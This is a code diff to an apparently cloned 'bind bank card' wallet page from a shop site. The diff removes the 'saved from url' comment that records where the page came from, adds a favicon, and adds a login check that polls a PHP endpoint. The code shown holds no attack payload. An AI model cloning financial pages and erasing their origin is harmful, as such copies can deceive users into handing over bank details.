@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-<!-- saved from url=(0048)https://www.easyshopmid12.xyz/index/my/bind_bank -->
 <html lang="en" class="deeppurple-theme" style="cursor: url(&quot;img/touch.png&quot;), move;">
 
 <head>
@@ -12,6 +11,7 @@
     <link href="./Bind bank card_wallet_files/css" rel="stylesheet"><!-- Bootstrap core CSS -->
     <link href="./Bind bank card_wallet_files/bootstrap.min.css" rel="stylesheet"><!-- Swiper CSS -->
     <link href="./Bind bank card_wallet_files/swiper-bundle.min.css" rel="stylesheet">
+    <link rel="shortcut icon" href="./login_files/logo.png">
     <!-- Custom styles for this template -->
     <link href="./Bind bank card_wallet_files/style.css" rel="stylesheet">
     <link rel="stylesheet" href="./Bind bank card_wallet_files/public.css">
@@ -103,7 +103,24 @@
     <script charset="utf-8" src="./Bind bank card_wallet_files/jquery.progressBarTimer.js.download"></script>
     <script charset="utf-8" src="./Bind bank card_wallet_files/common.js.download"></script><!-- template custom js -->
     <script src="./Bind bank card_wallet_files/main.js.download"></script>
-    <script type="application/javascript">$(function () {
+    <script type="application/javascript">
+        function isLoggedIn(){
+            $.ajax({
+                url: "../serve/is_user_logged_in.php",
+                type: 'GET',
+                success: function (data) {
+                    data = JSON.parse(data)
+                    if(!data.result){
+                        window.location.replace('./login.html')
+                    }
+                },
+            });
+        }
+        $(function () {
+            isLoggedIn()
+            setInterval(()=>{
+                isLoggedIn()
+            },10000)
         $.ajax({
             url: "../serve/get_wallet_info.php",
             type: 'GET',
